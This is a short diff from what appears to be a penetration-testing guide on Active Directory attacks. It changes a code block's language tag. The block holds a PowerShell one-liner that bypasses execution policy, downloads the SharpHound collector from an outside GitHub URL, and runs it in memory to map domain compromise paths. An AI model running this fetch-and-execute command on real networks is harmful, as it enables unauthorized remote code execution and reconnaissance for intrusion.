@@ -4,7 +4,7 @@
 
 Use BloodHound to find compromission paths. First execute the collector on a host that is in the targeted domain.
 
-```markdown
+```powershell
 powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1’);Invoke-BloodHound"
 ```
 
